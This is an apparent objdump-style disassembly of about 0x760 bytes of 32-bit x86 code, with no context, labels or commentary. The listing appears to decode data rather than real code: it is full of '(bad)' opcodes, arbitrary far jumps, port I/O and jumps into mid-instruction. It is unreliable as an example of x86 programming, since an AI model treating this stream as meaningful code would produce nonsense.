  40ae53:	adc    dh,dl
  40ae55:	fwait
  40ae56:	loop   0x40ae33
  40ae58:	and    al,0x9f
  40ae5a:	push   ds
  40ae5b:	call   0x7f85:0xf776e531
  40ae62:	rcr    BYTE PTR [edx-0x49],cl
  40ae65:	push   esp
  40ae66:	shr    BYTE PTR [ebp+esi*8-0x1810859c],0x42
  40ae6e:	mov    cl,BYTE PTR [ecx+0x63]
  40ae71:	adc    ebx,DWORD PTR [ebp-0x2fd7ab34]
  40ae77:	jo     0x40ae87
  40ae79:	dec    esp
  40ae7a:	(bad)  [ebp+0x689f566c]
  40ae80:	xchg   esp,eax
  40ae81:	adc    ebp,DWORD PTR [esi+ebx*8-0x50]
  40ae85:	mov    al,dl
  40ae87:	mov    ecx,0x57f15252
  40ae8c:	mov    ah,0x5b
  40ae8e:	pop    es
  40ae8f:	out    dx,al
  40ae90:	out    0xa0,eax
  40ae92:	dec    ecx
  40ae93:	dec    esp
  40ae94:	dec    ecx
  40ae95:	fucom  st(3)
  40ae97:	lea    eax,[ecx-0x2ac1aba0]
  40ae9d:	xor    BYTE PTR [ebx+0x7b3f0703],al
  40aea3:	push   0x6edce5d6
  40aea8:	mov    eax,0x18b85dd
  40aead:	inc    esp
  40aeae:	icebp  
  40aeaf:	pop    ecx
  40aeb0:	call   0xeeae:0x94958540
  40aeb7:	in     eax,0x41
  40aeb9:	test   DWORD PTR [eax],ecx
  40aebb:	pop    es
  40aebc:	fdiv   QWORD PTR [edi]
  40aebe:	fst    st(7)
  40aec0:	iret   
  40aec1:	sbb    al,0xcd
  40aec3:	dec    ebx
  40aec4:	sahf   
  40aec5:	in     eax,0xdd
  40aec7:	icebp  
  40aec8:	sub    ch,bh
  40aeca:	xor    DWORD PTR [ebx+0x43],eax
  40aecd:	ins    DWORD PTR es:[edi],dx
  40aece:	add    DWORD PTR [edi-0x3c],edi
  40aed1:	jge    0x40af24
  40aed3:	push   cs
  40aed4:	fild   QWORD PTR [edx]
  40aed6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aed7:	add    al,0x14
  40aed9:	int    0x47
  40aedb:	push   edi
  40aedc:	sar    DWORD PTR [eax],0x3b
  40aedf:	aad    0xe3
  40aee1:	in     eax,dx
  40aee2:	jo     0x40ae7c
  40aee4:	xchg   ebp,eax
  40aee5:	dec    esi
  40aee6:	and    ebp,DWORD PTR [eax]
  40aee8:	or     ch,BYTE PTR [esi-0x6e]
  40aeeb:	lds    esi,FWORD PTR [eax]
  40aeed:	xchg   esp,eax
  40aeee:	mov    bl,0x22
  40aef0:	inc    ebx
  40aef1:	push   es
  40aef2:	xor    edi,DWORD PTR [esi-0x6d8bf9e6]
  40aef8:	mov    eax,DWORD PTR [ebx+ebx*2-0x58]
  40aefc:	in     al,dx
  40aefd:	rcr    DWORD PTR ds:0x1258620f,cl
  40af03:	iret   
  40af04:	retf   
  40af05:	mov    DWORD PTR [edx+0x24],esi
  40af08:	inc    eax
  40af09:	and    BYTE PTR [edx],cl
  40af0b:	fsub   st(6),st
  40af0d:	or     eax,0x2a87e2d5
  40af12:	rcl    edi,cl
  40af14:	dec    esi
  40af15:	push   ebp
  40af16:	mov    ecx,0xc2611f97
  40af1b:	cwde   
  40af1c:	adc    al,0x1
  40af1e:	inc    esp
  40af1f:	in     al,0xb0
  40af21:	dec    ebp
  40af22:	or     eax,0xe7e0b09
  40af27:	jne    0x40aee5
  40af29:	scas   eax,DWORD PTR es:[edi]
  40af2a:	push   edi
  40af2b:	ins    BYTE PTR es:[edi],dx
  40af2c:	jg     0x40af6a
  40af2e:	pop    ebx
  40af2f:	push   ecx
  40af30:	inc    ebp
  40af31:	pop    ss
  40af32:	lods   eax,DWORD PTR ds:[esi]
  40af33:	rol    BYTE PTR [edx-0x1d],0x22
  40af37:	(bad)  
  40af38:	push   edx
  40af39:	retf   
  40af3a:	inc    ebx
  40af3b:	retf   0xba42
  40af3e:	xchg   edi,eax
  40af3f:	mov    edx,0xfea38b9e
  40af44:	rol    DWORD PTR [ecx-0x31],0x6c
  40af48:	sar    BYTE PTR [esi+0x2e7c5ac1],1
  40af4e:	adc    ah,al
  40af50:	repnz or al,0x60
  40af53:	aam    0xe8
  40af55:	gs nop
  40af57:	cmp    DWORD PTR [ecx],eax
  40af59:	ror    BYTE PTR [ebp-0x18],1
  40af5c:	xor    ecx,DWORD PTR [ebx]
  40af5e:	cwde   
  40af5f:	ret    0xfea
  40af62:	xor    bh,bh
  40af64:	div    BYTE PTR [edx]
  40af66:	ret    
  40af67:	sub    DWORD PTR [edx+edi*4],edx
  40af6a:	jnp    0x40aeed
  40af6c:	clc    
  40af6d:	pop    ss
  40af6e:	in     al,dx
  40af6f:	xor    BYTE PTR [ecx+eax*4+0x89103ac],dh
  40af76:	mov    fs,WORD PTR [eax-0x62d8eb6f]
  40af7c:	and    edi,esi
  40af7e:	fld    TBYTE PTR [ebx-0x7]
  40af81:	outs   dx,DWORD PTR ds:[esi]
  40af82:	sub    eax,0x464ba2b4
  40af87:	mov    ch,0x6b
  40af89:	call   0xf8f0:0x112b75f1
  40af90:	adc    DWORD PTR [edi],edi
  40af92:	out    dx,eax
  40af93:	jecxz  0x40b004
  40af95:	(bad)  
  40af97:	out    0xf8,al
  40af99:	nop
  40af9a:	mov    BYTE PTR [eax],bh
  40af9c:	pop    esp
  40af9d:	imul   esp,DWORD PTR [eax],0xd904893a
  40afa3:	es in  eax,dx
  40afa5:	or     BYTE PTR [ebp-0xd7684bc],dl
  40afab:	stos   BYTE PTR es:[edi],al
  40afac:	mov    esi,0x3e7a5f
  40afb1:	int    0xfc
  40afb3:	aaa    
  40afb4:	(bad)  
  40afb5:	pusha  
  40afb6:	inc    eax
  40afb7:	ret    0x72ba
  40afba:	jbe    0x40b019
  40afbc:	inc    edx
  40afbe:	ret    
  40afbf:	lock mov ch,BYTE PTR [ebp+0x6b]
  40afc3:	xor    DWORD PTR [esi+0x5b],edi
  40afc6:	nop
  40afc7:	xor    eax,0xbe7799e2
  40afcc:	mov    bh,0x3f
  40afce:	jbe    0x40b027
  40afd0:	jae    0x40b000
  40afd2:	push   edx
  40afd3:	mov    ah,0xee
  40afd5:	or     DWORD PTR [ecx-0x2],ecx
  40afd8:	jmp    0x899f:0x7be0c3f0
  40afdf:	dec    edi
  40afe0:	mov    edx,0x983a2595
  40afe5:	sbb    eax,0xd1820b95
  40afea:	ss dec eax
  40afec:	ins    DWORD PTR es:[edi],dx
  40afed:	dec    edx
  40afee:	js     0x40b04d
  40aff0:	jge    0x40b022
  40aff2:	cmc    
  40aff3:	inc    ecx
  40aff4:	pop    ebp
  40aff5:	pop    ecx
  40aff6:	or     eax,DWORD PTR [esi-0x12]
  40aff9:	mov    eax,ds:0x38bb2e33
  40affe:	sub    eax,0xdb0b67e7
  40b003:	sub    ebp,edx
  40b005:	jle    0x40b07c
  40b007:	hlt    
  40b008:	push   eax
  40b009:	(bad)  
  40b00a:	adc    ax,0x4f2c
  40b00e:	in     al,dx
  40b00f:	cwde   
  40b010:	sub    eax,0x1dcb1643
  40b015:	cli    
  40b016:	sub    BYTE PTR [ecx+0x39e1600a],dl
  40b01c:	mul    WORD PTR [edi+ebx*4+0x46]
  40b021:	test   al,0xfa
  40b023:	xlat   BYTE PTR ds:[ebx]
  40b024:	mov    eax,ds:0x39cb3522
  40b029:	test   bl,0xdb
  40b02c:	sub    BYTE PTR ds:0xd1a798c4,ah
  40b032:	push   es
  40b033:	loope  0x40b0a0
  40b035:	dec    BYTE PTR [eax+0x20]
  40b038:	fchs   
  40b03a:	or     DWORD PTR [edi+0x35],esp
  40b03d:	adc    BYTE PTR [ebx+0x44],dh
  40b040:	push   ecx
  40b041:	pop    ecx
  40b042:	jnp    0x40afe3
  40b044:	int    0xf8
  40b046:	sbb    ch,ah
  40b048:	jmp    0x35f8:0x220c9fad
  40b04f:	(bad)  
  40b050:	jno    0x40b06b
  40b052:	aad    0xe0
  40b054:	cwde   
  40b055:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40b057:	and    al,0xc5
  40b059:	or     al,0x4b
  40b05b:	loop   0x40afff
  40b05d:	sbb    ah,BYTE PTR [edi+ebp*4-0x4]
  40b061:	outs   dx,BYTE PTR ds:[esi]
  40b062:	xchg   esp,eax
  40b063:	pop    ss
  40b064:	jb     0x40b0d7
  40b066:	dec    edi
  40b067:	arpl   WORD PTR [ebp-0x7],di
  40b06a:	jbe    0x40b0cf
  40b06c:	xlat   BYTE PTR ds:[ebx]
  40b06d:	and    DWORD PTR [ecx],0x55
  40b070:	outs   dx,BYTE PTR ds:[esi]
  40b071:	sar    dh,0x44
  40b074:	in     eax,0xb1
  40b076:	out    0xce,al
  40b078:	push   ds
  40b079:	push   esp
  40b07a:	jnp    0x40b061
  40b07c:	ror    ah,0x97
  40b07f:	add    al,0xfb
  40b081:	pop    ecx
  40b082:	mov    ebp,DWORD PTR [esi-0x5c]
  40b085:	adc    DWORD PTR [eax+ecx*2-0x37b11fe],eax
  40b08c:	dec    esp
  40b08d:	mov    BYTE PTR [edi-0x55],dl
  40b090:	and    ebx,ecx
  40b092:	jmp    0x40b0e6
  40b094:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b095:	lfs    esp,FWORD PTR [ebp+0x7c71c2e1]
  40b09c:	outs   dx,BYTE PTR ds:[esi]
  40b09d:	jmp    0xdaaf70b9
  40b0a2:	sbb    bl,dl
  40b0a4:	out    0x24,al
  40b0a6:	imul   eax,esi,0x92b6c4df
  40b0ac:	add    BYTE PTR cs:[esp+ecx*1+0x4f72a10b],bh
  40b0b4:	test   BYTE PTR [eax-0x7c],al
  40b0b7:	das    
  40b0b8:	mov    cl,0x5
  40b0ba:	sbb    eax,0x21c84eda
  40b0bf:	xor    al,0x37
  40b0c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0c2:	das    
  40b0c3:	jecxz  0x40b0f7
  40b0c5:	mov    bl,ah
  40b0c7:	mov    ebx,0x67de5c2a
  40b0cc:	inc    esp
  40b0cd:	dec    eax
  40b0ce:	and    BYTE PTR [edi-0x74],0xce
  40b0d2:	fisubr WORD PTR [esi+ebp*2]
  40b0d5:	in     al,0xd1
  40b0d7:	in     al,0xc4
  40b0d9:	or     eax,edi
  40b0db:	sbb    BYTE PTR [eax+0x3b],bh
  40b0de:	test   eax,0x135e04bf
  40b0e3:	out    0xdc,eax
  40b0e5:	push   ebx
  40b0e6:	cmc    
  40b0e7:	je     0x40b0a4
  40b0e9:	mov    eax,0xe81dc6e6
  40b0ee:	lds    esi,FWORD PTR [edx-0xc9cd5d3]
  40b0f4:	in     al,dx
  40b0f5:	(bad)
  40b0f8:	pop    eax
  40b0f9:	and    BYTE PTR [esi-0x406b330e],ch
  40b0ff:	ins    BYTE PTR es:[edi],dx
  40b100:	mov    BYTE PTR [ebx],cl
  40b102:	jo     0x40b117
  40b104:	sub    BYTE PTR ds:0x93da9da4,al
  40b10a:	jae    0x40b0eb
  40b10c:	sbb    DWORD PTR [edx+0x15ded440],esp
  40b112:	pop    esp
  40b113:	pushf  
  40b114:	scas   eax,DWORD PTR es:[edi]
  40b115:	jmp    0xaf30:0x4a065c1d
  40b11c:	sahf   
  40b11d:	jb     0x40b142
  40b11f:	mov    ch,0x88
  40b121:	ror    DWORD PTR [esi-0x709e5bd5],cl
  40b127:	jl     0x40b0fb
  40b129:	adc    DWORD PTR [esi+0x3d],ebp
  40b12c:	mov    ecx,DWORD PTR [eax+0x33]
  40b12f:	pop    edx
  40b130:	adc    eax,0xd730fb6e
  40b135:	fadd   st,st(1)
  40b137:	or     ebx,esi
  40b139:	dec    ebx
  40b13a:	aaa    
  40b13b:	daa    
  40b13c:	sub    al,0xc
  40b13e:	jo     0x40b0f4
  40b140:	adc    DWORD PTR [ebx+ecx*4+0x38],0xffffffd6
  40b145:	mov    esp,0xe1dfaa33
  40b14a:	cmc    
  40b14b:	jmp    0x9c8fa3ee
  40b150:	pop    eax
  40b151:	xchg   ebp,eax
  40b152:	std    
  40b153:	pop    edx
  40b154:	jno    0x40b16d
  40b156:	sub    eax,0x3a25885e
  40b15b:	fimul  WORD PTR ds:[esi+0x69]
  40b15f:	fild   WORD PTR [ebp-0x69]
  40b162:	(bad)  
  40b164:	repnz mov edi,0xfea377af
  40b16a:	(bad)  
  40b16b:	sbb    DWORD PTR [ecx+ebp*2-0x34],ebx
  40b16f:	dec    ebx
  40b170:	dec    edx
  40b171:	and    al,0xe8
  40b173:	jb     0x40b1a4
  40b175:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b176:	scas   al,BYTE PTR es:[edi]
  40b177:	fidivr WORD PTR [eax-0x78e7dc66]
  40b17d:	cmp    eax,0x2636ce41
  40b182:	dec    eax
  40b183:	cld    
  40b184:	std    
  40b185:	aad    0x8f
  40b187:	jmp    0xf5511a3f
  40b18c:	mov    eax,DWORD PTR [eax-0x7107faff]
  40b192:	dec    eax
  40b193:	and    BYTE PTR ds:0x895c3ea2,0x9f
  40b19a:	add    ah,BYTE PTR [eax-0x649257bf]
  40b1a0:	ror    DWORD PTR [ebx],cl
  40b1a2:	retf   
  40b1a3:	sub    cl,BYTE PTR [ecx-0x1]
  40b1a6:	xor    edx,DWORD PTR [edx+0x64]
  40b1a9:	fidivr WORD PTR [esi]
  40b1ab:	jo     0x40b153
  40b1ad:	pop    esi
  40b1ae:	ins    BYTE PTR es:[edi],dx
  40b1af:	mov    bh,BYTE PTR [ebx-0x70]
  40b1b2:	fneni(8087 only) 
  40b1b4:	sbb    DWORD PTR [edi+0x78],eax
  40b1b7:	jp     0x40b1df
  40b1b9:	inc    ebp
  40b1ba:	and    DWORD PTR [edx+0x7d],esi
  40b1bd:	mov    bh,0x8b
  40b1bf:	test   al,0xfd
  40b1c1:	jp     0x40b148
  40b1c3:	dec    edx
  40b1c4:	jns    0x40b1a8
  40b1c6:	adc    DWORD PTR [edx+0x7136320f],0xf1c725ca
  40b1d0:	into   
  40b1d1:	loope  0x40b202
  40b1d3:	into   
  40b1d4:	std    
  40b1d5:	add    DWORD PTR [ebx],edx
  40b1d7:	inc    edi
  40b1d8:	cdq    
  40b1d9:	add    esp,esi
  40b1db:	popf   
  40b1dc:	jmp    0x4068:0xa0d6fe7
  40b1e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1e4:	sub    esp,DWORD PTR [edx]
  40b1e6:	(bad)  
  40b1e8:	xlat   BYTE PTR ds:[ebx]
  40b1e9:	pushf  
  40b1ea:	lods   al,BYTE PTR ds:[esi]
  40b1eb:	inc    ebp
  40b1ec:	mov    BYTE PTR [ebp+0x57675bcc],al
  40b1f2:	jle    0x40b1a6
  40b1f4:	sub    eax,0x3b08cd87
  40b1f9:	(bad)  
  40b1fa:	sbb    al,0xc4
  40b1fc:	jns    0x40b1ea
  40b1fe:	or     DWORD PTR [edx+0x33873938],eax
  40b204:	stos   DWORD PTR es:[edi],eax
  40b205:	lahf   
  40b206:	in     eax,0x31
  40b208:	not    DWORD PTR [eax-0x29]
  40b20b:	retf   
  40b20c:	in     al,dx
  40b20d:	lea    esp,[edx+edi*4]
  40b210:	test   DWORD PTR [ebp+0xdc28dd4],eax
  40b216:	jp     0x40b22f
  40b218:	fisubr DWORD PTR [edx]
  40b21a:	ins    BYTE PTR es:[edi],dx
  40b21b:	out    0xa7,al
  40b21d:	push   edi
  40b21e:	mov    ch,0xe9
  40b220:	inc    esp
  40b221:	test   DWORD PTR [ebx+0x46974f93],ecx
  40b227:	adc    ah,BYTE PTR [ecx+0x42]
  40b22a:	enter  0xf104,0x56
  40b22e:	ror    DWORD PTR [edi+0x1b211f9d],1
  40b234:	or     eax,0xcf6b567b
  40b239:	int    0x16
  40b23b:	shl    BYTE PTR [edi-0x3c],cl
  40b23e:	pop    edx
  40b23f:	hlt    
  40b240:	push   edx
  40b241:	dec    ebx
  40b242:	dec    ecx
  40b243:	clc    
  40b244:	es sub eax,0x2d529ffb
  40b24a:	or     ah,dl
  40b24c:	frstor [edi]
  40b24e:	pop    es
  40b24f:	imul   edi,DWORD PTR [eax+0x58],0x703bf23c
  40b256:	cmp    al,BYTE PTR [edi+0xb]
  40b259:	or     ecx,DWORD PTR [edi+0x21]
  40b25c:	cmp    BYTE PTR [esi],dl
  40b25e:	adc    BYTE PTR [eax-0x3036b022],0xe4
  40b265:	in     eax,0x93
  40b267:	dec    ebp
  40b268:	cmp    al,BYTE PTR [eax]
  40b26a:	sahf   
  40b26b:	ret    0xde51
  40b26e:	push   ecx
  40b26f:	xchg   ebp,eax
  40b270:	push   ebp
  40b271:	xchg   DWORD PTR [eax+0x6e],ebx
  40b274:	lock aam 0x53
  40b277:	push   edx
  40b278:	(bad)  
  40b279:	lahf   
  40b27a:	jl     0x40b24f
  40b27c:	jecxz  0x40b206
  40b27e:	fild   WORD PTR [esi-0x4e]
  40b281:	fmul   DWORD PTR [ebx-0x101a33d3]
  40b287:	xlat   BYTE PTR ds:[ebx]
  40b288:	pop    eax
  40b289:	cmc    
  40b28a:	and    DWORD PTR [ecx+0x23ce4790],esp
  40b290:	xor    DWORD PTR [ebx-0x1e4bdc3f],ebx
  40b296:	cli    
  40b297:	fidiv  DWORD PTR [esi+0x49]
  40b29a:	inc    DWORD PTR [ebx]
  40b29c:	cmp    al,0x54
  40b29e:	pusha  
  40b29f:	repz or DWORD PTR [eax+ebx*8-0x72],ecx
  40b2a4:	mov    ebp,0xbb230687
  40b2a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2aa:	ret    
  40b2ab:	aas    
  40b2ac:	shl    DWORD PTR [ebx+0x175ce964],0xc0
  40b2b3:	das    
  40b2b4:	push   ds
  40b2b5:	daa    
  40b2b6:	mov    cl,0x6f
  40b2b8:	mov    esp,0xff9e201e
  40b2bd:	inc    ecx
  40b2be:	and    dh,bh
  40b2c0:	adc    BYTE PTR [ebx+esi*8+0x3c],0xb8
  40b2c5:	add    ebx,esi
  40b2c7:	loop   0x40b2a1
  40b2c9:	dec    edx
  40b2ca:	mov    dh,0x30
  40b2cc:	call   0xe018bcd9
  40b2d1:	sub    ebx,DWORD PTR [ebx-0x21]
  40b2d4:	outs   dx,DWORD PTR ds:[esi]
  40b2d5:	loopne 0x40b2a7
  40b2d7:	fcom   QWORD PTR [ebp-0x58]
  40b2da:	push   edx
  40b2db:	cmp    BYTE PTR [esp+esi*2],ah
  40b2de:	enter  0x211,0x31
  40b2e2:	scas   eax,DWORD PTR es:[edi]
  40b2e3:	test   DWORD PTR [edi],0xcc8c11f1
  40b2e9:	sub    edx,ebp
  40b2eb:	mov    WORD PTR [esi],?
  40b2ed:	inc    esi
  40b2ee:	(bad)  
  40b2ef:	mov    edx,0xa0a27e0e
  40b2f4:	ds repnz xchg dl,al
  40b2f8:	test   DWORD PTR [eax],edx
  40b2fa:	scas   eax,DWORD PTR es:[edi]
  40b2fb:	jmp    0x78ed:0x4c84439
  40b302:	jl     0x40b35b
  40b304:	and    DWORD PTR [ebp+eiz*4-0x50],esp
  40b308:	leave  
  40b309:	jp     0x40b299
  40b30b:	sti    
  40b30c:	fisttp WORD PTR [eax-0x7d]
  40b30f:	mov    esi,0x41b1ea8d
  40b314:	cmp    DWORD PTR [ecx],esi
  40b316:	dec    esi
  40b317:	and    BYTE PTR [ebx-0x3592e8ee],dl
  40b31d:	(bad)  
  40b31e:	fldcw  WORD PTR [ebp+0x16]
  40b321:	(bad)  
  40b322:	and    al,0x99
  40b324:	push   ds
  40b325:	mov    edi,0xfe97b8e3
  40b32a:	pop    es
  40b32b:	out    dx,al
  40b32c:	fisubr WORD PTR [ebx-0x68]
  40b32f:	mov    edi,0x4d94a0ac
  40b334:	pop    ss
  40b335:	adc    BYTE PTR [ebp+0x3c9c3ebb],bh
  40b33b:	inc    ebp
  40b33c:	shl    DWORD PTR [edi+0x6d],cl
  40b33f:	les    eax,FWORD PTR [esi-0xc1d25e5]
  40b345:	cdq    
  40b346:	or     DWORD PTR [esi-0x61],ebx
  40b349:	scas   eax,DWORD PTR es:[edi]
  40b34a:	fimul  DWORD PTR [eax]
  40b34c:	mov    dh,ah
  40b34e:	xchg   ecx,eax
  40b34f:	add    al,0xe4
  40b351:	pop    esi
  40b352:	adc    DWORD PTR [edx+0x55a69c0b],ebx
  40b358:	push   ebx
  40b359:	imul   BYTE PTR [esi]
  40b35b:	cmp    al,cl
  40b35d:	mov    fs,WORD PTR [edx]
  40b35f:	sub    al,0x46
  40b361:	mov    esi,0x6e9902ae
  40b366:	shl    DWORD PTR [edi+0x5afc2196],cl
  40b36c:	sbb    ecx,DWORD PTR [bp+di+0x27]
  40b370:	xor    BYTE PTR ds:0x861985e0,ch
  40b376:	adc    DWORD PTR [esi],edx
  40b378:	xchg   edi,eax
  40b379:	jno    0x40b3a1
  40b37b:	(bad)  
  40b37c:	mov    eax,0x1fa2cfee
  40b381:	inc    esi
  40b382:	cmp    al,BYTE PTR [ecx+esi*1+0x6e969184]
  40b389:	daa    
  40b38a:	jp     0x40b3ac
  40b38c:	repnz mov ah,0xdf
  40b38f:	add    al,0x7a
  40b391:	and    esp,DWORD PTR [ebx]
  40b393:	stos   BYTE PTR es:[edi],al
  40b394:	fwait
  40b395:	or     BYTE PTR [esi+ebx*1+0x462aef13],al
  40b39c:	sub    DWORD PTR [ecx+0x6e],ecx
  40b39f:	mov    dl,0xb3
  40b3a1:	iret   
  40b3a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3a3:	in     al,0x3e
  40b3a5:	xchg   ebp,eax
  40b3a6:	add    eax,0x916ead15
  40b3ab:	sbb    ch,BYTE PTR [esi]
  40b3ad:	ja     0x40b3cd
  40b3af:	xor    DWORD PTR [edx],ebx
  40b3b1:	xchg   ebx,eax
  40b3b2:	outs   dx,BYTE PTR ds:[esi]
  40b3b3:	xchg   dh,bl
  40b3b5:	sbb    bl,BYTE PTR [eax-0x2b]
  40b3b8:	mov    eax,ds:0x818e2baa
  40b3bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3be:	scas   al,BYTE PTR es:[edi]
  40b3bf:	xlat   BYTE PTR ds:[ebx]
  40b3c0:	jo     0x40b36d
  40b3c2:	mov    al,ds:0x1b529010
  40b3c7:	ret    
  40b3c8:	push   esi
  40b3c9:	ins    BYTE PTR es:[edi],dx
  40b3ca:	stos   BYTE PTR es:[edi],al
  40b3cb:	xor    eax,0x235388d6
  40b3d0:	fisub  DWORD PTR [esi-0x5966927a]
  40b3d6:	ret    
  40b3d7:	test   al,0x88
  40b3d9:	daa    
  40b3da:	or     cl,bl
  40b3dc:	int3   
  40b3dd:	mov    bl,0x1a
  40b3df:	cmc    
  40b3e0:	inc    esi
  40b3e1:	and    eax,0x5faec2ae
  40b3e6:	mov    ss,WORD PTR [esi]
  40b3e8:	inc    esp
  40b3e9:	and    ecx,DWORD PTR [ecx+0x3b994ef4]
  40b3ef:	cli    
  40b3f0:	cmp    BYTE PTR [ecx+0x4e],ah
  40b3f3:	xor    eax,0xd7b9cd28
  40b3f8:	imul   ecx,DWORD PTR [edi],0xffffffee
  40b3fb:	and    bh,bl
  40b3fd:	enter  0x4183,0x5d
  40b401:	jp     0x40b391
  40b403:	fldcw  WORD PTR [eax+0x264257e1]
  40b409:	or     BYTE PTR ds:0xaa8bb472,ch
  40b40f:	mov    ebx,0x3a9b3928
  40b414:	leave  
  40b415:	push   ebx
  40b416:	enter  0xf151,0xca
  40b41a:	out    dx,al
  40b41b:	dec    esi
  40b41c:	jno    0x40b3ae
  40b41e:	dec    edi
  40b41f:	aam    0xb6
  40b421:	sub    edi,DWORD PTR [esi+0x3c293c91]
  40b427:	(bad)  
  40b428:	into   
  40b429:	or     ebx,DWORD PTR [ebp-0x40cefb8a]
  40b42f:	mov    bh,0x3a
  40b431:	repnz jecxz 0x40b494
  40b434:	jns    0x40b481
  40b436:	pop    ebx
  40b437:	jmp    0x170f1086
  40b43c:	pop    ebp
  40b43d:	into   
  40b43e:	sbb    ch,BYTE PTR [edx]
  40b440:	or     DWORD PTR [ebp-0x69bfc910],0x9
  40b447:	sub    ecx,edx
  40b449:	arpl   WORD PTR [edi+0x18],bx
  40b44c:	call   0x5b8a:0x4cb879c9
  40b453:	or     DWORD PTR [edi+esi*8],ebx
  40b456:	daa    
  40b457:	ret    
  40b458:	test   eax,0x358f4edd
  40b45d:	mov    dl,cl
  40b45f:	mov    gs,WORD PTR [edi+0x61]
  40b462:	xchg   esi,eax
  40b463:	inc    eax
  40b464:	jb     0x40b416
  40b466:	out    dx,al
  40b467:	ins    DWORD PTR es:[edi],dx
  40b468:	pop    ebp
  40b469:	pop    ebx
  40b46a:	shl    DWORD PTR [ecx-0x6c],cl
  40b46d:	bound  edx,QWORD PTR [edi]
  40b46f:	ror    DWORD PTR [eax-0x7],1
  40b472:	rcl    DWORD PTR [esi+0x63],0xb7
  40b476:	and    DWORD PTR [bx+si],esp
  40b479:	sbb    BYTE PTR [edx+esi*2-0x2ceb9bf3],dl
  40b480:	push   ss
  40b481:	jo     0x40b432
  40b483:	pop    ecx
  40b484:	push   esi
  40b485:	call   0xd0df6dfd
  40b48a:	stc    
  40b48b:	mov    ds:0x60c9ceee,eax
  40b490:	inc    edx
  40b491:	retf   
  40b492:	nop
  40b493:	rcr    DWORD PTR [bp+di+0x4c8c],0xad
  40b499:	or     esp,DWORD PTR [edi]
  40b49b:	pop    ebx
  40b49c:	fcom   DWORD PTR [eax]
  40b49e:	mov    ch,BYTE PTR [ecx+0x48]
  40b4a1:	cmc    
  40b4a2:	pop    ecx
  40b4a3:	sbb    esp,DWORD PTR [ecx]
  40b4a5:	jp     0x40b435
  40b4a7:	fucomi st,st(5)
  40b4a9:	(bad)  
  40b4aa:	sub    eax,0xd731b790
  40b4af:	fsub   st,st(7)
  40b4b1:	fldenv [esi-0x3f]
  40b4b4:	mov    edi,DWORD PTR [ecx-0x12]
  40b4b7:	shl    DWORD PTR [edx],0x17
  40b4ba:	(bad)  
  40b4bb:	fistp  QWORD PTR [edi]
  40b4bd:	jle    0x40b45f
  40b4bf:	push   esi
  40b4c0:	sub    al,0x8a
  40b4c2:	push   ebp
  40b4c3:	(bad)  
  40b4c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4c5:	aaa    
  40b4c6:	(bad)  [eax+0x53f63475]
  40b4cc:	mov    esi,0x36498ad0
  40b4d1:	jne    0x40b4b2
  40b4d3:	(bad)  
  40b4d4:	call   0xe961402b
  40b4d9:	mov    bl,0xe2
  40b4db:	cdq    
  40b4dc:	pop    ebx
  40b4dd:	outs   dx,BYTE PTR ds:[esi]
  40b4de:	pushf  
  40b4df:	icebp  
  40b4e0:	pop    esi
  40b4e1:	jmp    0x24c9398a
  40b4e6:	cmp    DWORD PTR [ecx-0x7e9a5c0e],edx
  40b4ec:	into   
  40b4ed:	pop    esp
  40b4ee:	cdq    
  40b4ef:	aaa    
  40b4f0:	inc    esi
  40b4f1:	fcomp  QWORD PTR [esi-0x14237047]
  40b4f7:	jnp    0x40b48a
  40b4f9:	inc    ecx
  40b4fa:	pop    eax
  40b4fb:	fistp  DWORD PTR [ecx+ecx*8+0xe]
  40b4ff:	ss sbb eax,0xa7146127
  40b505:	pop    edx
  40b506:	sub    eax,0x640197d0
  40b50b:	jne    0x40b49b
  40b50d:	imul   edi,esp,0x9734d6b8
  40b513:	cmp    ch,cl
  40b515:	into   
  40b516:	call   0x5d9d6a46
  40b51b:	cmp    DWORD PTR [ebp+0x2d905bf5],esi
  40b521:	xchg   BYTE PTR [ebp-0x5],bh
  40b524:	xchg   DWORD PTR [eax+0x1fd745ce],edx
  40b52a:	sbb    DWORD PTR [edi+0x3c],0xb34fccb4
  40b531:	jno    0x40b4bc
  40b533:	imul   edx,DWORD PTR [esi-0x48],0xffffffb5
  40b537:	shl    BYTE PTR [ecx-0x1f376104],cl
  40b53d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b53e:	cmc    
  40b53f:	or     eax,0xf720b818
  40b544:	lds    esi,FWORD PTR [ebp-0x48]
  40b547:	jno    0x40b542
  40b549:	inc    esi
  40b54a:	xchg   edi,eax
  40b54b:	push   ecx
  40b54c:	and    ebp,0x41104fca
  40b552:	scas   al,BYTE PTR es:[edi]
  40b553:	xor    eax,0x7f2aab15
  40b558:	ds jge 0x40b4f9
  40b55b:	pop    edi
  40b55c:	pop    esp
  40b55d:	aas    
  40b55e:	not    BYTE PTR [eax-0x5c6635c]
  40b564:	sbb    BYTE PTR [ecx+0x2543294c],dh
  40b56a:	mov    ah,0x30
  40b56c:	retf   
  40b56d:	in     eax,dx
  40b56e:	jmp    0x443aedf8
  40b573:	loopne 0x40b505
  40b575:	push   esi
  40b576:	and    ebp,esp
  40b578:	inc    ecx
  40b579:	iret   
  40b57a:	jmp    0xd833d77f
  40b57f:	test   BYTE PTR [edi],al
  40b581:	adc    eax,0x5e369fb2
  40b586:	inc    ebp
  40b587:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b588:	inc    esp
  40b589:	psrld  mm1,0x31
  40b58d:	sub    DWORD PTR [ebp+0xd],ebx
  40b590:	and    BYTE PTR [edi-0x67],0x15
  40b594:	fwait
  40b595:	pushf  
  40b596:	xchg   edx,eax
  40b597:	lods   al,BYTE PTR es:[esi]
  40b599:	retf   
  40b59a:	pop    eax
  40b59b:	pop    ecx
  40b59c:	dec    ecx
  40b59d:	dec    esi
  40b59e:	popa   
  40b59f:	std    
  40b5a0:	cmp    DWORD PTR [eax-0x4e],0xffffffd9
  40b5a4:	dec    edx
  40b5a5:	mov    ds:0x209784c3,al
  40b5aa:	inc    ebp
